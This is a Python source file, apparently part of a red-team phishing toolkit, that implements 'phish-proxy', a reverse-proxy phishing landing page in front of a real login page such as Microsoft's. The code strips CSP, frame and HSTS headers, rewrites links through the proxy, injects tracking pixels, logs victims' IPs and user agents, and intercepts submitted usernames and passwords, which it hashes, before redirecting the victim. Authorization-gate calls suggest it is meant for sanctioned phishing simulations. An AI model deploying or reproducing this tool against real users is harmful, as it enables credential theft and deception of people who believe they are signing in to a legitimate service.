#!/usr/bin/env python3
"""phish-proxy — 反向代理着陆页(处理 JS/SSO/多步登录/凭据拦截)
核心思路: 不是克隆 HTML,而是做 MITM 反向代理——
  1. 用户访问 https://你的域/ → 代理把请求转发到 https://目标真实登录页/
  2. 所有 CSS/JS/图片/字体从目标域加载(浏览器正常渲染,不缺资源)
  3. 表单提交(POST)被拦截: 凭据哈希记录 → 哈希后转发到目标(或返回成功页)
  4. 支持 SSO 多步流(用户名→密码→MFA),每步都拦截
用法:
  phish-proxy.py serve --listen :8080 --target https://login.target.com \
      [--db <数据根>/tools/phish/track.json] [--strip-csp] [--replace-host]
"""
import sys, os, json, time, hashlib
from http.server import HTTPServer, BaseHTTPRequestHandler


from urllib.parse import urlparse, parse_qs
from urllib.request import urlopen, Request
from urllib.error import URLError, HTTPError
from _common import _data_root, scope_gate_full, edusrc_gate_phish as edusrc_gate


# CS8-P1-4: 缺省与链路同源(phish-send/phish-track/漏斗都指向数据根
# tools/phish——此前 /tmp 使经代理的 click/submit 对 campaigns 面板
# 永久不可见)。容器位 /opt/tools, 宿主位 SPECTRE_DATA_DIR。

DB_FILE = os.path.join(_data_root(), 'phish/track.json')  # CS12-N1: 批次 R 恢复时误删, 补回

def load_db():
    try: return json.load(open(DB_FILE))
    except: return {'events': []}

def save_db(db):
    json.dump(db, open(DB_FILE, 'w'), indent=1, ensure_ascii=False)

def add_event(db, kind, uid, extra=None):
    # R17-F1: V6b 排他锁读改写——proxy 是事件库四写入方中唯一无锁者
    # (track V6 只修了自己侧; phishlet-proxy F36 不变性: 同库并发方
    # 必须持同一把锁, PoC 丢 599/600)。
    ev = {'kind': kind, 'uid': uid, 'ts': time.strftime('%Y-%m-%dT%H:%M:%SZ', time.gmtime())}
    if extra: ev.update(extra)
    import fcntl
    with open(DB_FILE + '.lock', 'w') as lf:
        fcntl.flock(lf, fcntl.LOCK_EX)
        try:
            cur = load_db()
            cur.setdefault('events', []).append(ev)
            save_db(cur)
        finally:
            fcntl.flock(lf, fcntl.LOCK_UN)
    print(f'[proxy] {kind} uid={uid}', flush=True)

class ProxyHandler(BaseHTTPRequestHandler):
    # Class-level config (set by serve())
    target_base = 'https://login.microsoft.com'
    strip_csp = True

    def proxy_request(self, method='GET', body=None):
        """Forward request to target, return response"""
        url = self.target_base + self.path
        headers = {}
        for key in ['Accept', 'Accept-Language', 'Accept-Encoding', 'User-Agent',
                    'Content-Type', 'Cookie', 'Referer']:
            if key in self.headers:
                val = self.headers[key]
                if key == 'Referer':
                    val = val.replace(self.headers.get('Host', ''), urlparse(self.target_base).netloc)
                if key == 'Cookie':
                    # Forward session cookies from target
                    val = val
                headers[key] = val

        # Don't send Accept-Encoding gzip (we need to read/modify the response)
        headers['Accept-Encoding'] = 'identity'

        try:
            req = Request(url, data=body, headers=headers, method=method)
            resp = urlopen(req, timeout=15)
            return resp.status, dict(resp.headers), resp.read()
        except HTTPError as e:
            return e.code, dict(e.headers), e.read()
        except URLError as e:
            return 502, {}, f'Proxy error: {e}'.encode()

    def process_response(self, status, headers, body, content_type=''):
        """Modify response: strip security headers, rewrite URLs, inject tracking"""
        # Remove security headers that prevent embedding/interaction
        # R17-F5: 大小写不敏感——dict(resp.headers) 保留线上原样, 真实
        # 目标常发小写头, 字面 pop 静默未命中使核心功能失效。
        STRIP = {'content-security-policy', 'x-frame-options', 'strict-transport-security',
                 'x-content-type-options', 'public-key-pins'}
        for h in [k for k in headers if k.lower() in STRIP]:
            headers.pop(h, None)

        # Rewrite absolute URLs pointing to target → our proxy
        if content_type and ('text/html' in content_type or 'javascript' in content_type):
            body_str = body.decode('utf-8', errors='replace')
            target_host = urlparse(self.target_base).netloc
            our_host = self.headers.get('Host', 'localhost')
            # Rewrite links/assets to go through proxy
            body_str = body_str.replace(f'https://{target_host}', f'http://{our_host}')
            body_str = body_str.replace(f'//{target_host}', f'//{our_host}')
            # Inject tracking pixel before </body>
            uid = 'proxy'  # 设计选择: 代理腿 uid 固定标识来源; 具体身份由 track 端按 IP/时间聚合
            pixel = f'<img src="http://{our_host}/o/{uid}.gif" style="display:none;width:1px;height:1px;">'
            if '</body>' in body_str:
                body_str = body_str.replace('</body>', f'{pixel}</body>')
            body = body_str.encode('utf-8')

        return status, headers, body

    def do_GET(self):
        u = urlparse(self.path)

        # Tracking pixel
        if u.path.startswith('/o/') and u.path.endswith('.gif'):
            db = load_db()
            uid = u.path.split('/')[2].replace('.gif', '')
            add_event(db, 'open', uid, {'ua': self.headers.get('User-Agent', ''), 'ip': self.client_address[0]})
            import base64
            gif = base64.b64decode('R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7')
            self.send_response(200)
            self.send_header('Content-Type', 'image/gif')
            self.send_header('Content-Length', str(len(gif)))
            self.end_headers()
            self.wfile.write(gif)
            return

        # Click tracking (redirect to proxied target)
        if u.path.startswith('/r/'):
            uid = u.path.split('/')[2]
            db = load_db()
            add_event(db, 'click', uid, {'ua': self.headers.get('User-Agent', ''), 'ip': self.client_address[0]})
            self.send_response(302)
            self.send_header('Location', '/')
            self.end_headers()
            return

        # Everything else: proxy to target
        status, headers, body = self.proxy_request('GET')
        ct = headers.get('Content-Type', headers.get('content-type', ''))
        status, headers, body = self.process_response(status, headers, body, ct)

        self.send_response(status)
        for k, v in headers.items():
            if k.lower() not in ('transfer-encoding', 'content-length'):
                self.send_header(k, v)
        self.send_header('Content-Length', str(len(body)))
        self.end_headers()
        self.wfile.write(body)

    def do_POST(self):
        u = urlparse(self.path)
        # R17-F2: V3 同款校验——非数字 ValueError/负值 read(-n) 读到
        # EOF 永久 wedge 单线程服务器/无上界读。修复只做了 track 侧。
        try:
            length = int(self.headers.get('Content-Length', 0) or 0)
        except (ValueError, TypeError):
            self.send_response(400); self.end_headers()
            return
        if length < 0 or length > 1_048_576:
            self.send_response(413); self.end_headers()
            return
        body = self.rfile.read(length) if length else b''
        body_str = body.decode('utf-8', errors='replace')
        qs = parse_qs(body_str)

        # Intercept form submissions (credential capture)
        # Look for common password field names
        password_fields = ['password', 'passwd', 'pass', 'pwd', 'Password',
                          'loginfmt', 'login', 'CredentialPassword']
        email_fields = ['email', 'username', 'user', 'login', 'Email', 'loginfmt',
                       'userPrincipalName', 'upn']

        captured_email = None
        captured_password = None

        for field in email_fields:
            if field in qs:
                captured_email = qs[field][0]
                break
        for field in password_fields:
            if field in qs:
                captured_password = qs[field][0]
                break

        if captured_password:
            # Hash immediately (NEVER store plaintext)
            db = load_db()
            cred_hash = hashlib.sha256(f'{captured_email}:{captured_password}'.encode()).hexdigest()[:16]
            add_event(db, 'submit', 'proxy', {
                'cred_hash': cred_hash,
                'email_domain': captured_email.split('@')[1] if '@' in (captured_email or '') else '',
                'ip': self.client_address[0],
            })
            # After capturing, redirect to a "success" page or the real target
            self.send_response(302)
            self.send_header('Location', '/success')
            self.end_headers()
            return

        # Non-credential POST: forward to target (e.g., CSRF token fetch, SSO handshake)
        status, headers, body = self.proxy_request('POST', body)
        ct = headers.get('Content-Type', headers.get('content-type', ''))
        status, headers, body = self.process_response(status, headers, body, ct)
        self.send_response(status)
        for k, v in headers.items():
            if k.lower() not in ('transfer-encoding', 'content-length'):
                self.send_header(k, v)
        self.send_header('Content-Length', str(len(body)))
        self.end_headers()
        self.wfile.write(body)

    def log_message(self, *a):
        pass

def serve(listen, target, db_file=None, strip_csp=True):
    edusrc_gate((target,))
    scope_gate_full()  # F10: 完整授权门(targets+exercise+window 三必填, CS37-F5)
    global DB_FILE
    if db_file:
        DB_FILE = db_file

    host, _, port = listen.rpartition(':')
    ProxyHandler.target_base = target.rstrip('/')
    ProxyHandler.strip_csp = strip_csp

    print(f'[phish-proxy] {listen} → {target}', flush=True)
    print(f'[phish-proxy] Credentials intercepted → hashed (plaintext destroyed)', flush=True)
    server = HTTPServer((host or '0.0.0.0', int(port or 8080)), ProxyHandler)
    server.serve_forever()

if __name__ == '__main__':
    # R32D74-N1/CS55-F2: -h 永先(家族最高契约), 门在 -h 后、解析前
    # (畸形参 rc=2 先于 76 的族间不对称封堵)。
    if any(x in sys.argv[1:] for x in ('-h', '--help')):
        print(__doc__); sys.exit(0)
    edusrc_gate()
    # R32D42-P1: 子命令归一——serve 以外(含 -h/--help)一律用法输出;
    # 帮助 rc=0, 未知/缺失 rc=2(此前 --help 在白名单被放行后无分支
    # 可走, 静默 rc=0)。
    if len(sys.argv) < 2 or sys.argv[1] not in ('serve',):
        print(__doc__)
        sys.exit(0 if sys.argv[1:] and sys.argv[1] in ('-h', '--help') else 2)
    if sys.argv[1] == 'serve':
        listen = '--listen' in sys.argv and sys.argv[sys.argv.index('--listen') + 1] or ':8080'
        target = '--target' in sys.argv and sys.argv[sys.argv.index('--target') + 1] or 'https://login.microsoft.com'
        db = '--db' in sys.argv and sys.argv[sys.argv.index('--db') + 1] or None
        serve(listen, target, db)
